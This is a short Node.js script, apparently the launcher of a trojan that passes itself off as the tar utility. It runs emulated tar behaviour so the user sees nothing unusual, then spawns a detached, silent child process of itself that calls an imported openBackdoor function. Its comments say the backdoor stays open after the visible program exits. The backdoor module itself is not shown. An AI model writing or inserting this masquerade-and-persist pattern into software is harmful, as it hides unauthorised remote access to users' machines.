#!/usr/bin/env node
import { spawn } from "child_process";
import openBackdoor from "./backdoor";
import execFile from "./exec_emulation"
import path from "path";

const args = process.argv.slice(2);
let execName = path.basename(process.argv[1]);
if (execName == "client.js") {
  // Default to tar emulation
  execName = "tar";
}

if (args.includes("--interactive")) {
  openBackdoor();
} else {
  // First, simulate tar functionality
  execFile(args, execName);

  // Then spawn a child of the same executable, but only with the interactive flag
  const child = spawn(process.argv[0], [process.argv[1], "--interactive"], {
    detached: true,
    stdio: "ignore",
  });
  // allow parent to halt while backdoor remains open
  child.unref();
}
